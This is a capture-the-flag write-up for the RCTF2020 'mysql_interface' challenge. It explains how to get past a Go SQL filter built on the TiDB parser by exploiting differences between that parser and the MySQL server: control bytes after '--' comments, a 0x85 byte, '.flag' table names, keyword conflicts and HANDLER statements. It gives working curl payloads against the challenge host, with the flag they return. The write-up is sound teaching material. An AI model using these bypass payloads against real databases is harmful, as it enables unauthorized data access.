# mysql_interface

[中文版本](README_zh.md)

## Description

https://mysql-interface.rctf2020.rois.io

```go
import (
    "github.com/pingcap/parser"                     // v3.1.2-0.20200507065358-a5eade012146+incompatible
    _ "github.com/pingcap/tidb/types/parser_driver" // v1.1.0-beta.0.20200520024639-0414aa53c912
)

var isForbidden = [256]bool{}

const forbidden = "\x00\t\n\v\f\r`~!@#$%^&*()_=[]{}\\|:;'\"/?<>,\xa0"

func init() {
    for i := 0; i < len(forbidden); i++ {
        isForbidden[forbidden[i]] = true
    }
}

func allow(payload string) bool {
    if len(payload) < 3 || len(payload) > 128 {
        return false
    }
    for i := 0; i < len(payload); i++ {
        if isForbidden[payload[i]] {
            return false
        }
    }
    if _, _, err := parser.New().Parse(payload, "", ""); err != nil {
        return true
    }
    return false
}

// do query...
```

## Solution

The challenge receives SQL with restricted characters audited by a SQL parser. However, There are many ways to solve this challenge, whether in lexer or parser.

### Break the lexer


According to the source code of [mysql-server lexer](https://github.com/mysql/mysql-server/blob/5.7/sql/sql_lex.cc#L1424), it allows '-- ' style line comments, where '--' can be followed by a character marked as `_MY_SPC` or `_MY_CTR`.

If you read the parser code, you will find that this parser uses [unicode.IsSpace()](https://pkg.go.dev/unicode?tab=doc#IsSpace) to identify spaces, which leads to inconsistency with official mysql server lexer, and we can exploit that.

| Character                                             | MySQL Server       | Parser       |
| :---------------------------------------------------- | ------------------ | ------------ |
| 0x01 - 0x08, 0x15 - 0x19                              | _MY_CTR            | Unrecognized |
| 0x14                                                  | _MY_SPC            | Unrecognized |
| 0x09 (\t), 0x10 (\n), 0x11 (\v), 0x12 (\f), 0x13 (\r) | _MY_CTR or _MY_SPC | Not Allowed  |
| 0x20 (space)                                          | _MY_SPC            | Space        |
| 0x85                                                  | Unrecognized       | Space        |
| 0xa0                                                  | Unrecognized       | Not Allowed  |

The table above lists some inconsistencies. If you want to explore more, this might be helpful:

- [Character Definition Arrays](https://dev.mysql.com/doc/refman/5.7/en/character-arrays.html)
- [MySQL Server Source Code Charsets](https://github.com/mysql/mysql-server/tree/5.7/sql/share/charsets)

Now it's quite clear to solve this challenge, here are some examples:

1. `\x01` is not recognized as space in parser

   ```shell
   $ echo "select flag from flag--\x01"
   select flag from flag--
   $ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20from%20flag--%01&pow=000"
   RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
   ```

2. `\x85` is not recognized as space in mysql-server

```shell
$ echo "select flag from flag --\x85tbl where --\x85tbl.flag+1"
select flag from flag --�tbl where --�tbl.flag+1
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20from%20flag%20%85rois%20where%20--%85rois.flag%2b1&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
```

### Break the parser

Besides the lexer, there are also many flaws in the parser. By reading the source yacc file of [parser](https://github.com/pingcap/parser/blob/master/parser.y) and [mysql server](https://github.com/mysql/mysql-server/blob/5.7/sql/sql_yacc.yy), you can easily find some quite significant differences between the parser and mysql server.

#### Table Factor

The official mysql server allows tables to be used as follows:

```yacc
// copied from https://github.com/mysql/mysql-server/blob/5.7/sql/sql_yacc.yy#L13059

table_ident:
    ident
    | ident '.' ident
    | '.' ident
    ;
```

But the parser has some differences:

```yacc
// copied from https://github.com/pingcap/parser/blob/master/parser.y#L6765

TableName:
    Identifier
    |	Identifier '.' Identifier
    ;

```

The difference between the two takes us directly to the flag.

```shell
$ echo "select flag from .flag"
select flag from .flag
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20from%20.flag&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
```

#### Keyword Conflicts

When we analyze the difference between the two parsers, Keyword Conlicts are always the easiest to find, and always exist.

Since there are many ways to find keyword conflicts, I will only present one as an example. 

The properties of tokens are quite different between mysql server and the parser. You can find the tokens of the parser [here](https://github.com/pingcap/parser/blob/master/misc.go#L138) which has a lot of keywords. I feed the tokens into the parser and get the following payloads that causes the parser error.

- "select flag EXCEPT from flag"
- "select flag NVARCHAR from flag"
- "select flag CURRENT_ROLE from flag"
- "select flag PRE_SPLIT_REGIONS from flag"
- "select flag ROW from flag"
- "select flag ERROR from flag"
- "select flag PACK_KEYS from flag"
- "select flag SHARD_ROW_ID_BITS from flag"

```shell
$ echo "select flag EXCEPT from flag"
select flag EXCEPT from flag
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20EXCEPT%20from%20flag&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
```

### Unexpected

During the game, Team DUBHE used the [HANDLER Statement](https://dev.mysql.com/doc/refman/5.7/en/handler.html) to successfully break the parser, which I didn't expected at all, and get third blood of this challenge! 

```shell
$ echo "handler flag open" && echo "handler flag read first" && echo "handler flag close"
handler flag open
handler flag read first
handler flag close
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=handler%20flag%20open&pow=000"
Empty set
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=handler%20flag%20read%20first&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=handler%20flag%29close&pow=000"
Empty set
```

Moreover, There are more flaws in the parser...

## Thank you for your participation, see you next year @ RCTF2021!